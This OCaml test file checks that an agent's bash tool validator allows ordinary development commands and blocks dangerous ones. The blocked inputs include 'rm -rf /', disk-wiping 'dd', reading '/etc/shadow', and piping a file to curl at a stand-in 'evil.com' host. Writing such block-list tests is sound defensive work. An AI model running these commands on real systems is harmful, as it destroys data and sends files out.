(** Tests that keeper_bash blocks dangerous commands via allowlist.

    Validates:
    1. Allowed commands (dune, git, rg, etc.) pass validation
    2. Dangerous commands (rm, curl, kill, etc.) are blocked
    3. Shell metacharacters (;, |, &, etc.) are rejected
    4. Empty commands are rejected *)

let validate = Masc_mcp.Worker_dev_tools.validate_command

let is_ok = function Ok () -> true | Error _ -> false
let is_error = function Error _ -> true | Ok () -> false
let error_msg = function Error m -> m | Ok () -> ""

let test_allowed_commands () =
  let allowed = [
    "dune build";
    "git status";
    "git log --oneline -5";
    "rg 'pattern' lib/";
    "make test";
    "python3 script.py";
    "npm run build";
    "pnpm run build";
    "cat README.md";
    "ls -la";
    "head -20 file.ml";
    "wc -l lib/*.ml";
    "opam install eio";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "allowed: %s" cmd) true (is_ok (validate cmd))
  ) allowed

let test_blocked_commands () =
  let blocked = [
    "rm -rf /";
    "rm file.txt";
    "curl https://evil.com";
    "wget http://example.com";
    "kill -9 1234";
    "killall main_eio.exe";
    "chmod 777 /etc/passwd";
    "chown root file";
    "sudo anything";
    "ssh user@host";
    "scp file user@host:";
    "dd if=/dev/zero of=/dev/sda";
    "mkfs.ext4 /dev/sda1";
    "shutdown -h now";
    "reboot";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool)
      (Printf.sprintf "blocked: %s" cmd) true (is_error (validate cmd))
  ) blocked

let test_shell_metachar_blocked () =
  let chained = [
    "ls; rm -rf /";
    "cat file | curl http://evil.com";
    "echo x && rm -rf /";
    "cat file > /etc/passwd";
    "cat < /etc/shadow";
    "echo `whoami`";
    "echo $HOME";
  ] in
  List.iter (fun cmd ->
    let result = validate cmd in
    Alcotest.(check bool)
      (Printf.sprintf "metachar blocked: %s" cmd) true (is_error result);
    let msg = error_msg result in
    Alcotest.(check bool)
      "error mentions chaining" true
      (String.length msg > 0)
  ) chained

let test_empty_command () =
  Alcotest.(check bool) "empty blocked" true (is_error (validate ""));
  Alcotest.(check bool) "whitespace blocked" true (is_error (validate "   "))

let is_write = Masc_mcp.Worker_dev_tools.is_write_operation

let test_write_ops_detected () =
  let writes = [
    "git push origin main";
    "git commit -m 'msg'";
    "git merge feature";
    "git rebase main";
    "git reset --hard HEAD~1";
    "git checkout other-branch";
    "git stash pop";
    "dune clean";
    "make deploy";
    "make install";
    "npm publish";
    "pnpm install";
    "pnpm publish";
    "mv file1 file2";
    "cp src dst";
    "mkdir newdir";
    "touch newfile";
    "chmod 755 script.sh";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "write: %s" cmd) true (is_write cmd)
  ) writes

let test_read_ops_pass () =
  let reads = [
    "git status";
    "git log --oneline -5";
    "git diff HEAD";
    "dune build";
    "dune exec test.exe";
    "make test";
    "npm run build";
    "npm run dev";
    "pnpm run build";
    "pnpm run dev";
    "rg pattern lib/";
    "cat file.ml";
    "ls -la";
    "head -20 file.ml";
    "python3 script.py";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "read: %s" cmd) false (is_write cmd)
  ) reads

(* ── rg exit code semantics ──────────────────────────────── *)

let test_rg_exit_code_semantics () =
  (* rg: 0=matches, 1=no matches (valid), 2+=error *)
  let is_ok st = st = Unix.WEXITED 0 || st = Unix.WEXITED 1 in
  Alcotest.(check bool) "exit 0 is ok" true (is_ok (Unix.WEXITED 0));
  Alcotest.(check bool) "exit 1 (no match) is ok" true (is_ok (Unix.WEXITED 1));
  Alcotest.(check bool) "exit 2 (error) is not ok" false (is_ok (Unix.WEXITED 2));
  Alcotest.(check bool) "exit 127 (not found) is not ok" false (is_ok (Unix.WEXITED 127))

(* ── git_worktree op: action validation ───────────────────── *)

let test_git_worktree_action_normalization () =
  (* Verify action aliases normalize correctly *)
  let normalize a = String.trim a |> String.lowercase_ascii in
  Alcotest.(check string) "list" "list" (normalize "list");
  Alcotest.(check string) "add" "add" (normalize " Add ");
  Alcotest.(check string) "LIST uppercase" "list" (normalize "LIST");
  Alcotest.(check string) "unknown stays" "remove" (normalize "remove")

let test_git_worktree_branch_required () =
  (* action=add with empty branch should be rejected *)
  let branch = String.trim "" in
  Alcotest.(check bool) "empty branch rejected" true (branch = "")

let () =
  Alcotest.run "Keeper bash safety" [
    ("allowlist", [
      Alcotest.test_case "allowed dev commands pass" `Quick test_allowed_commands;
      Alcotest.test_case "dangerous commands blocked" `Quick test_blocked_commands;
    ]);
    ("metachar", [
      Alcotest.test_case "shell metacharacters blocked" `Quick test_shell_metachar_blocked;
    ]);
    ("write_gate", [
      Alcotest.test_case "write operations detected" `Quick test_write_ops_detected;
      Alcotest.test_case "read operations pass" `Quick test_read_ops_pass;
    ]);
    ("edge", [
      Alcotest.test_case "empty command blocked" `Quick test_empty_command;
    ]);
    ("rg_exit_code", [
      Alcotest.test_case "rg exit semantics (0=ok, 1=ok, 2+=error)" `Quick test_rg_exit_code_semantics;
    ]);
    ("git_worktree_op", [
      Alcotest.test_case "action normalization" `Quick test_git_worktree_action_normalization;
      Alcotest.test_case "branch required for add" `Quick test_git_worktree_branch_required;
    ]);
  ]
